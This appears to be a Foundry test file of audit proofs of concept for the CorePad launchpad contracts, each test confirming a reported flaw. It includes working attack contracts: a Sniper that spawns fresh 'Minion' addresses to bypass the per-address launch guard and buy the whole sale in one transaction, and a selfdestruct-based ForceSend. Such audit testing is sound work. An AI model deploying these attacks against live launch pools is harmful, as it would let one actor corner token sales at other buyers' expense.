// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Base} from "../Base.t.sol";
import {LaunchPool} from "../../src/LaunchPool.sol";
import {CorePadToken} from "../../src/CorePadToken.sol";
import {CorePadFactory} from "../../src/CorePadFactory.sol";
import {Settlement} from "../../src/Settlement.sol";

/// @notice Audit proofs of concept. Each test PASSES while the reported behaviour exists
///         (i.e. a green test == finding confirmed on the current src/). See docs/AUDIT.md.

/// @dev One address-per-minion buyer: buys in its constructor, forwards the tokens to `boss`.
contract Minion {
    constructor(LaunchPool pool, address boss) payable {
        uint256 got = pool.buy{value: msg.value}(0, block.timestamp);
        pool.token().transfer(boss, got);
        if (address(this).balance != 0) payable(boss).transfer(address(this).balance);
    }

    receive() external payable {}
}

/// @dev Fills the whole 800 M sale in ONE transaction, inside the launch guard window.
contract Sniper {
    function snipe(LaunchPool pool, uint256 perMinion) external payable returns (uint256 minions) {
        while (!pool.frozen()) {
            uint256 x = pool.virtualHype();
            uint256 y = pool.virtualToken();
            uint256 remaining = pool.SALE_SUPPLY() - pool.tokensSold();
            uint256 value;
            if (remaining <= perMinion) {
                value = pool.hypeToGraduate();
            } else {
                uint256 net = (x * perMinion + (y - perMinion) - 1) / (y - perMinion);
                value = (net * 10_000 + 9_899) / 9_900;
            }
            new Minion{value: value}(pool, address(this));
            ++minions;
        }
    }

    receive() external payable {}
}

/// @dev Forces ETH into a contract without a receive() (SELFDESTRUCT in the creation tx, EIP-6780).
contract ForceSend {
    constructor(address to) payable {
        selfdestruct(payable(to));
    }
}

contract AuditPoC is Base {
    // ------------------------------------------------------------------ M-1
    /// Symbols are neither unique across launches nor checked against tickers that already exist on
    /// HyperCore. The keeper bids for `symbol()` verbatim; the second "CORE" (or any "HYPE"/"USDC"
    /// launch) can never be listed, so its whole raise ends in keeper custody or in `rescue`.
    function test_poc_duplicateAndReservedSymbolsAccepted() public {
        vm.startPrank(bob);
        (, address t1,) = factory.launch("Core Test", "CORE", 0);
        (, address t2,) = factory.launch("Core Test", "CORE", 0);
        (, address t3,) = factory.launch("Hyperliquid", "HYPE", 0);
        (, address t4,) = factory.launch("USD Coin", "USDC", 0);
        vm.stopPrank();
        assertEq(CorePadToken(t1).symbol(), CorePadToken(t2).symbol());
        assertEq(CorePadToken(t1).name(), CorePadToken(t2).name());
        assertTrue(t1 != t2);
        assertEq(CorePadToken(t3).symbol(), "HYPE");
        assertEq(CorePadToken(t4).symbol(), "USDC");
    }

    // ------------------------------------------------------------------ M-2
    /// After `rescue`, the whole raise goes to the treasury while holders keep 800 M tokens that can
    /// never be sold back (the pool is frozen forever) and will never be listed.
    function test_poc_rescueConfiscatesRaiseHoldersStranded() public {
        (LaunchPool pool, CorePadToken token) = _launch();
        _fillToGraduation(pool);
        uint256 raised = pool.realHype();
        uint256 id = pool.graduate();

        vm.warp(block.timestamp + RESCUE_DELAY);
        uint256 before = treasury.balance;
        vm.prank(treasury);
        settlement.rescue(id);
        assertEq(treasury.balance - before, raised);

        uint256 bobTokens = token.balanceOf(bob);
        assertGt(bobTokens, 0);
        vm.startPrank(bob);
        token.approve(address(pool), bobTokens);
        vm.expectRevert(LaunchPool.PoolFrozen.selector);
        pool.sell(bobTokens, 0, block.timestamp);
        vm.stopPrank();
        assertEq(uint256(settlement.stateOf(id)), uint256(Settlement.State.Rescued));
    }

    // ------------------------------------------------------------------ M-3
    /// If `setFactory` ever points at anything but the factory whose pools use this Settlement,
    /// every pool that reaches 800 M is frozen for good: no buy, no sell, graduate() reverts.
    /// The pool has no escape hatch of its own.
    function test_poc_wrongFactoryLocksFrozenPoolForever() public {
        Settlement s2 = new Settlement(owner, treasury, keeper, address(adapter), RESCUE_DELAY);
        CorePadFactory f2 = new CorePadFactory(address(s2), treasury, address(0), G, TICKER, GUARD_S, GUARD_MAX);
        vm.prank(owner);
        s2.setFactory(address(factory)); // wrong factory: not checked against f2.settlement()

        vm.prank(alice);
        (,, address p) = f2.launch("Core Test", "CORE", 0);
        LaunchPool pool = LaunchPool(payable(p));
        _fillToGraduation(pool);
        uint256 stuck = address(pool).balance;
        assertGt(stuck, 1 ether);

        vm.expectRevert(Settlement.OnlyPool.selector);
        pool.graduate();
        vm.prank(bob);
        vm.expectRevert(LaunchPool.PoolFrozen.selector);
        pool.sell(1e18, 0, block.timestamp);
        vm.warp(block.timestamp + 365 days);
        vm.expectRevert(Settlement.OnlyPool.selector);
        pool.graduate();
        assertEq(address(pool).balance, stuck);
    }

    // ------------------------------------------------------------------ L-1
    /// The per-address launch guard is bypassed in a single transaction by a contract that spawns
    /// fresh addresses: the whole sale is bought inside the guard window by one actor.
    function test_poc_singleTxSybilFillsCurveInsideGuard() public {
        (LaunchPool pool, CorePadToken token) = _launch();
        assertTrue(pool.guardActive());
        Sniper sniper = new Sniper();
        vm.deal(address(sniper), 0);
        vm.prank(carol);
        uint256 n = sniper.snipe{value: 10 ether}(pool, 9_990_000e18);
        assertTrue(pool.frozen());
        assertTrue(pool.guardActive());
        assertEq(token.balanceOf(address(sniper)), pool.SALE_SUPPLY());
        emit log_named_uint("minions used", n);
        emit log_named_uint("HYPE spent (wei)", 10 ether - address(sniper).balance);
    }

    // ------------------------------------------------------------------ L-2
    /// Forced ETH into Settlement (or tokens sent to Settlement / the adapter) can never leave.
    function test_poc_forcedEthAndDonationsStuck() public {
        (LaunchPool pool, CorePadToken token) = _launch();
        _fillToGraduation(pool);
        uint256 id = pool.graduate();
        new ForceSend{value: 1 ether}(address(settlement));
        assertEq(address(settlement).balance, settlement.lockedHype() + 1 ether);

        vm.prank(bob);
        token.transfer(address(adapter), 1e18);

        bridge.register(address(token));
        settlement.dispatch(id);
        vm.warp(block.timestamp + 365 days);
        assertEq(address(settlement).balance, 1 ether); // no sweep path
        assertEq(token.balanceOf(address(adapter)), 1e18); // no sweep path
    }

    // ------------------------------------------------------------------ L-3
    /// Unbounded `guardSeconds`: `launchedAt + guardSeconds` overflows and every public buy reverts
    /// (the creator buy still works because it skips the guard arithmetic). Graduation impossible.
    function test_poc_hugeGuardSecondsBricksBuys() public {
        CorePadFactory f3 =
            new CorePadFactory(address(settlement), treasury, address(0), G, TICKER, type(uint256).max, GUARD_MAX);
        vm.prank(alice);
        (,, address p) = f3.launch{value: 0.01 ether}("Core Test", "CORE", 0);
        LaunchPool pool = LaunchPool(payable(p));
        vm.prank(bob);
        vm.expectRevert(); // panic 0x11
        pool.buy{value: 0.01 ether}(0, block.timestamp);
    }

    // ------------------------------------------------------------------ I-1
    /// Fee is floor(1 %): any HYPE leg below 100 wei pays no fee.
    function test_poc_subHundredWeiBuyPaysNoFee() public {
        (LaunchPool pool,) = _launch();
        vm.warp(block.timestamp + GUARD_S);
        uint256 before = treasury.balance;
        _buy(pool, bob, 99);
        assertEq(treasury.balance, before);
    }

    // ------------------------------------------------------------------ I-2
    /// The keeper can confirm any dispatched ticket with arbitrary indexes; nothing is checked.
    function test_poc_keeperConfirmsArbitraryIndexes() public {
        (LaunchPool pool, CorePadToken token) = _launch();
        _fillToGraduation(pool);
        uint256 id = pool.graduate();
        bridge.register(address(token));
        settlement.dispatch(id);
        vm.prank(keeper);
        settlement.confirm(id, type(uint64).max, 0);
        assertEq(uint256(settlement.stateOf(id)), uint256(Settlement.State.Confirmed));
    }
}
